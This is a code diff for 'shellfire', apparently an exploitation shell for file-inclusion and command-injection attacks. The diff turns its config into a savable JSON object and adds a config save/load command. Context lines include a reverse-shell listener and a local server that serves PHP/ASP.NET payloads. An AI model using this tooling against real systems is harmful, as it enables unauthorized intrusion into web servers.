@@ -17,6 +17,7 @@ import threading
 import time
 
 from plugin_collection import PluginCollection
+#from pydantic import BaseModel
 
 ############################################################
 ## Version Check
@@ -28,37 +29,50 @@ if (sys.version_info < (3, 0)):
 ############################################################
 ## Configs
 
-class cfg:
-  version = "0.7.b"
-  url = "http://www.example.com?"
-  history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
-  post_data = {}
-  cookies = {}
-  headers = {
-    'User-Agent': '',
-    'Referer': ''
-  }
+class Configs():
+  def __init__(self):
+    self.version = "0.7.b"
+    self.url = "http://www.example.com?"
+    self.history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
+    self.post_data = {}
+    self.cookies = {}
+    self.headers = {
+      'User-Agent': '',
+      'Referer': ''
+    }
+    
+    """The default header set for outgoing requests.
+    """
+    self.default_headers = {
+      'User-Agent': ''
+    }
+    
+    self.method = "get"
+    
+    self.auth = None
+    self.auth_user = None
+    self.auth_pass = None
+    self.payload = ""
+    self.payload_type = "PHP"
+    self.encode_chain = []
+    self.encode = None
+    self.marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
+    self.http_port = 8888
   
-  """The default header set for outgoing requests.
-  """
-  default_headers = {
-    'User-Agent': ''
-  }
+  def dump(self):
+    return json.dumps(self.__dict__)
 
-  method = "get"
+  def load(self, json_cfg):
+    self.__dict__.update(json_cfg)
+    return
 
-  auth = None
-  auth_user = None
-  auth_pass = None
-  payload = ""
-  payload_type = "PHP"
-  encode_chain = []
-  encode = None
-  marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
-  http_port = 8888
-  http_running = False
-  revshell_running = False
+cfg = Configs()
 
+############################################################
+## Ephemeral states
+
+http_running = False
+revshell_running = False
 plugins = PluginCollection('plugins')
 userinput = None
 
@@ -103,6 +117,7 @@ if ($_GET['cmd'] == '_show_phpinfo') {{
 ## Parse options
 
 parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
+parser.add_argument('-c', dest='config', action='store', nargs='?', default=None, const='default', help='load a named config on startup.')
 parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
 parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
 args = parser.parse_args()
@@ -116,6 +131,9 @@ def show_help(cmd=None):
   if cmd == "auth":
     sys.stdout.write(".auth - show current HTTP Auth credentials\n")
     sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
+  elif cmd == "config":
+    sys.stdout.write(".config save [name] - save a named config\n")
+    sys.stdout.write(".config load [name] - load a named config\n")
   elif cmd == "cookies":
     sys.stdout.write(".cookies - show current cookies to be sent with each request\n")
     sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
@@ -191,7 +209,7 @@ def http_server(port):
   sock.bind((addr, port))
   sock.listen(1)
   ## server loop
-  while cfg.http_running == True:
+  while http_running == True:
     try:
       if not conn:
         conn, addr = sock.accept()
@@ -212,7 +230,8 @@ def http_server(port):
 def rev_shell(addr, port):
   ## setup listener for reverse shell
   port = int(port)
-  cfg.revshell_running = True
+  global revshell_running
+  revshell_running = True
   conn = None
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -230,7 +249,7 @@ def rev_shell(addr, port):
       if s == conn:
         data = s.recv(4096)
         if not data:
-          cfg.revshell_running = False
+          revshell_running = False
           return
         else:
           sys.stdout.write(data)
@@ -241,7 +260,7 @@ def rev_shell(addr, port):
 
   ## cleanup
   conn.close()
-  cfg.revshell_running = False
+  revshell_running = False
   return
 
 def cmd_auth(cmd):
@@ -251,6 +270,36 @@ def cmd_auth(cmd):
     cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
   else:
     sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
+  return
+
+def cmd_config(cmd):
+  ## manage our configs
+  if len(cmd) > 3:
+    sys.stdout.write("[!] Invalid parameters for .config\n")
+    return
+  elif len(cmd) > 1:
+    if len(cmd) == 3:
+      name = cmd[2] + ".cfg"
+    else:
+      name = 'default.cfg'
+    config_path = os.path.expanduser("~") + "/.config/shellfire/"
+    name = config_path + name
+    if cmd[1] == "save":
+      ## make sure our directory exists
+      if not os.path.isdir(config_path):
+        os.mkdir(config_path)
+      ## save our config to json
+      with open(name, 'w') as my_config:
+        my_config.write(cfg.dump())
+        sys.stdout.write("[*] Config saved.\n")
+    elif cmd[1] == "load":
+      ## load json into our config
+      try:
+        with open(name, 'r') as my_config:
+          cfg.load(json.load(my_config))
+          sys.stdout.write("[*] Config restored.\n")
+      except:
+        sys.stdout.write("[!] Unable to restore config!\n")
   return
 
 def cmd_cookies(cmd):
@@ -332,15 +381,16 @@ def cmd_history(cmd):
 
 def cmd_http(cmd):
   ## control our local http server
+  global http_running
   if len(cmd) == 1:
-    if cfg.http_running == True:
+    if http_running == True:
       sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
       sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
     else:
       sys.stdout.write("[*] HTTP server is not running\n")
     return
   if cmd[1] == "start":
-    if cfg.http_running == False:
+    if http_running == False:
       if len(cmd) > 2:
         try:
           cfg.http_port = int(cmd[2])
@@ -349,13 +399,13 @@ def cmd_http(cmd):
           return False
       s = threading.Thread(target=http_server, args=(cfg.http_port,))
       s.start()
-      cfg.http_running = True
+      http_running = True
       sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
     else:
       sys.stderr.write("[!] HTTP server already running\n")
   elif cmd[1] == "stop":
-    if cfg.http_running == True:
-      cfg.http_running = False
+    if http_running == True:
+      http_running = False
       time.sleep(1)
     else:
       sys.stderr.write("[!] HTTP server already stopped\n")
@@ -527,6 +577,9 @@ if args.debug == True:
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
+## if we specified to load a named config, do it now
+if args.config:
+  cmd_config([".config", "load", args.config])
 
 ## setup history
 if os.path.isfile(cfg.history_file):
@@ -540,7 +593,7 @@ payload_php()
 
 ## main loop
 while True:
-  while cfg.revshell_running:
+  while revshell_running:
     time.sleep(0.1)
   ## reset command execution state each loop
   exec_cmd = False
@@ -551,12 +604,14 @@ while True:
   ## parse our input
   cmd = userinput.split()
   if cmd[0] == ".exit" or cmd[0] == ".quit":
-    cfg.http_running = False
+    http_running = False
     if os.path.isfile(cfg.history_file):
         readline.write_history_file(cfg.history_file)
     sys.exit(0)
   elif cmd[0] == ".auth":
     cmd_auth(cmd)
+  elif cmd[0] == ".config":
+    cmd_config(cmd)
   elif cmd[0] == ".cookies":
     cmd_cookies(cmd)
   elif cmd[0] == ".encode":
